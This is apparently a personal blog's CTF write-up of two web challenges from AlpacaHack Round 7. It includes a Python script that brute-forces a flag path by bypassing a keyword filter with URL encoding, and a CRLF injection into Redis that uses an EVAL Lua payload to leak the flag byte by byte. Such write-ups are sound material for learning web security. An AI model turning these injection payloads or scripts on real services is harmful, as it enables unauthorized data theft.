---
weight: 1
title: AlpacaHack CTF 2024 Web Writeups
date: 2024-11-30T13:32:12+03:00
draft: false
author: Jonathan Levy
authorLink: https://jonathann403.github.io
description: Writeups for WEB challenges in AlpacaHack (7th round) CTF 2024.
tags:
  - web
  - xss
  - redis
  - bruteforce
lightgallery: true
toc:
  enable: true
lastmod: 2024-11-30T13:32:12+03:00
---
## Introduction

While searching for a CTF to participate in this weekend with my team (FF2), I stumbled upon one by accident—and it turned out to be a great find! Hosted by a group from Tokyo, AlpacaHack is a CTF platform that organizes monthly CTF competitions (rounds), each focusing on a different theme. This time, it was web security!

## "Treasure Hunt" (116 pts, 71 solves)

![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/alpacahack-round-7/Pasted%20image%2020241130131728.png?raw=true)

Inside the challenge's files we have the server code files along with some random files containing emojis
![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/alpacahack-round-7/Pasted%20image%2020241130131955.png?raw=true)

in the `Dockerfile`, we can see this weird flag storing method:
![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/alpacahack-round-7/Pasted%20image%2020241130132149.png?raw=true)

![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/alpacahack-round-7/Pasted%20image%2020241130132640.png?raw=true)
after pasting it to terminal, we can see that flag's path is `./public/3/8/7/6/9/1/7/c/b/d/1/b/3/d/b/1/2/e/3/9/5/8/7/c/6/6/a/c/2/8/9/1/f/l/a/g/./t/x/t`  (a-f, 1-9)
while `public` means that we can GET to this file.

In `index.js` , at `GET /` the server returns this html that contains the files under the `./public` directory.

![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/alpacahack-round-7/Pasted%20image%2020241130133026.png?raw=true)
The server also returns `400` if the url contains `f,l,a,g` .
I've managed to bypass this check by passing the letters as url encoded:
![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/alpacahack-round-7/Pasted%20image%2020241130133401.png?raw=true)
![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/alpacahack-round-7/Pasted%20image%2020241130133527.png?raw=true)

now we need to get into the flag's directory and get the flag.
To do that, I need a way to find if any directory exist on the server, and I can do that by sending a request to the a directory (without `/`), for example: `GET /hello`,
If this directory exist server automatically redirects me to `/hello/`.

Let's see how I can automate it with python to get the flag.

```python
import httpx

url = "http://34.170.146.252:19843"
chars = "0123456789abcdeflagtxt"
flag = ""

with httpx.Client(base_url=url) as client:
    while True:
        for c in chars:
            path = flag + "/" + f"%{ord(c):02X}"
            response = client.get(path)

            if response.status_code == 301:
                flag = path
                print(flag)
                break
            elif response.status_code == 200:
                print(response.text)
                exit()
```

I've tried to make it with `requests` but it keeps redirecting me so I had to do it with httpx...
![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/alpacahack-round-7/Pasted%20image%2020241130135946.png?raw=true)

## "Alpaca Poll" (146 pts, 42 solves)

![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/alpacahack-round-7/Pasted%20image%2020241130140118.png?raw=true)

![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/alpacahack-round-7/Pasted%20image%2020241130140230.png?raw=true)

This challenge suppose to be a poll site... let's look at the source code:
![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/alpacahack-round-7/Pasted%20image%2020241130140349.png?raw=true)

we can see that this one uses `redis`, let's see how he manages to speak with the server.


![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/alpacahack-round-7/Pasted%20image%2020241130140529.png?raw=true)
![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/alpacahack-round-7/Pasted%20image%2020241130140630.png?raw=true)

by taking a look on these functions (and comments lol), we can understand that we have to find an injection in here.
![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/alpacahack-round-7/Pasted%20image%2020241130141024.png?raw=true)
also, in the init function, we can see that the flag is in a `redis key` named `flag`.

I'll deploy this challenge locally because of this function that prints the input/output of the redis:
![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/alpacahack-round-7/Pasted%20image%2020241130140921.png?raw=true)

Let's now focus on the `POST /vote`:

The `replace()` only replaces the first appearance of the provided char... that means we can bypass this check and have a command injection.

```js
const message = `INCR ${animal}\r\n`;
```
so for injection, we need to get message to be:
```js
const message = `INCR dog\r\nGET flag\r\n`;
```

and to make it happen, we need `animal`'s value to be: `\r\ndog\r\nGET flag`

explanation:
the first `\r\n` are deleted because of the replace() function, and the rest is not moving anywhare.

and after url encoding:

`animal=%0D%0Adog%0D%0AGET%20flag`

in the server, it looks like that (redis command injected successfully):
![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/alpacahack-round-7/Pasted%20image%2020241130141921.png?raw=true)

Now we need to of a creative way to make the client see the value of the flag!

![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/alpacahack-round-7/Pasted%20image%2020241130142329.png?raw=true)
![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/alpacahack-round-7/Pasted%20image%2020241130142339.png?raw=true)
as you can see, every value that is being returned, is getting inside the `parseInt()` function.
that means we can't return a string of the flag, BUT, we CAN return the ascii value of each letter in the flag, and get it inside a string key like dog, and send a request to `\getVotes` to get a dictionary of the results!

After some research, we can do it using the `EVAL` cmd in `redis` that executes a `lua` script that gives more features to the command.

```lua
`EVAL "redis.call('SET', 'dog', string.byte(redis.call('GET', 'flag'), 1))" 0`
```

this will set dog's value to be flag's value at specific index of this string!

Now I can automate it with python:

```python
import requests
import json
import time

index = 1

vote_url = "http://localhost:3000/vote"
get_votes_url = "http://localhost:3000/votes"
flag = ""

while True:

	animal_value = f"\r\ndog\r\nEVAL \"redis.call('SET', 'dog', string.byte(redis.call('GET', 'flag'), {index}))\" 0"
	res = requests.post(vote_url, data={"animal": animal_value})
	print(res.text)
	res2 = requests.get(get_votes_url)
	flag += chr(json.loads(res2.text)["dog"])
	index += 1
	if chr(json.loads(res2.text)["dog"]) == '}': break

print(flag)	
```


this does the job :)

Now, instead of localhost, let's put our instance: 
```python
vote_url = "http://34.170.146.252:32483/vote"
get_votes_url = "http://34.170.146.252:32483/votes"
```
![image](https://github.com/jonathann403/jonathann403.github.io/blob/main/content/posts/alpacahack-round-7/Pasted%20image%2020241130145312.png?raw=true)

YAY!